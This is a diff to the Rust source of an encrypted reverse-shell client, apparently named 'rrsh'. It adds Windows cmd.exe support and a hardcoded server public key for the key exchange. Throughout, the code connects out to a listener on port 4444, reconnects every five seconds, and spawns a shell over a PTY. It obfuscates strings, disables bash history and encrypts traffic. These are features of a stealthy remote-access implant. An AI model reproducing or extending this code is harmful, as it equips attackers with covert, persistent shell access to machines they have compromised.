@@ -1,6 +1,7 @@
 use futures::{SinkExt, StreamExt};
 use portable_pty::{CommandBuilder, NativePtySystem, PtySize, PtySystem};
 use std::io::{Read, Write};
+use std::time::Duration;
 use tokio::{
     net::TcpStream as TokioTcpStream,
 };
@@ -11,7 +12,7 @@ use obfstr::obfstr;
 
 mod codec;
 use codec::EncryptedCodec;
-use revshell::do_handshake;
+use rrsh::{do_handshake, HandshakeRole};
 
 #[tokio::main]
 async fn main() {
@@ -21,7 +22,7 @@ async fn main() {
             Err(e) => eprintln!("[!] Connection error: {}. Retrying in 5 seconds...", e),
         }
 
-        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
+        tokio::time::sleep(Duration::from_secs(5)).await;
     }
 }
 
@@ -37,14 +38,25 @@ fn shell_setup() -> Result<portable_pty::PtyPair, Box<dyn std::error::Error>> {
         })
         .map_err(|e| format!("failed to create pty: {}", e))?;
 
-    let mut _cmd = CommandBuilder::new(obfstr!("/bin/bash"));
-    _cmd.env_clear();
-    _cmd.env(obfstr!("TERM"), obfstr!("xterm-256color"));
-    _cmd.env(obfstr!("PS1"), obfstr!("[V] \\u@\\h:\\w\\$ "));
-    _cmd.env(obfstr!("HISTFILESIZE"), "0");
-    _cmd.env(obfstr!("HISTSIZE"), "0");
+    let mut _cmd;
 
-    let _bash = pty_pair
+    #[cfg(not(target_os = "windows"))]
+    {
+        _cmd = CommandBuilder::new(obfstr!("/bin/bash"));
+        _cmd.env_clear();
+        _cmd.env(obfstr!("TERM"), obfstr!("xterm-256color"));
+        _cmd.env(obfstr!("PS1"), obfstr!("[V] \\u@\\h:\\w\\$ "));
+        _cmd.env(obfstr!("HISTFILESIZE"), "0");
+        _cmd.env(obfstr!("HISTSIZE"), "0");
+    }
+
+    #[cfg(target_os = "windows")]
+    {
+        _cmd = CommandBuilder::new(obfstr!("cmd.exe"));
+        _cmd.env(obfstr!("PROMPT"), obfstr!("[V] $P$G "));
+    }
+
+    let _sh = pty_pair
         .slave
         .spawn_command(_cmd)
         .map_err(|e| format!("failed to spawn: {}", e))?;
@@ -53,7 +65,12 @@ fn shell_setup() -> Result<portable_pty::PtyPair, Box<dyn std::error::Error>> {
 
 async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
     let mut stream = TokioTcpStream::connect(obfstr!("127.0.0.1:4444")).await?;
-    let (key_rx, key_tx) = do_handshake(&mut stream).await?;
+    let client_role = HandshakeRole::Client { 
+        server_public_key: x25519_dalek::PublicKey::from(
+            [152, 243, 212, 54, 136, 190, 128, 28, 24, 202, 202, 176, 95, 52, 236, 69, 218, 35, 112, 10, 137, 101, 212, 224, 14, 168, 82, 49, 127, 203, 238, 105]
+        )
+    };
+    let (key_rx, key_tx) = do_handshake(&mut stream, client_role).await?;
 
     let cipher_tx = ChaCha20Poly1305::new_from_slice(&key_tx).map_err(|e| format!("cipher init error: {}", e))?;
     let cipher_rx = ChaCha20Poly1305::new_from_slice(&key_rx).map_err(|e| format!("cipher init error: {}", e))?;
@@ -70,6 +87,9 @@ async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
     let (tx, mut rx) = tokio::sync::mpsc::channel::<Vec<u8>>(64);
     
     tokio::task::spawn_blocking(move || {
+        // This is actually quite suboptimial and I only need this because of
+        // the sync interface of portable-pty - this is good for potential Windows
+        // support though...
         let mut buf = [0u8; 4096];
         loop {
             match pty_reader.read(&mut buf) {
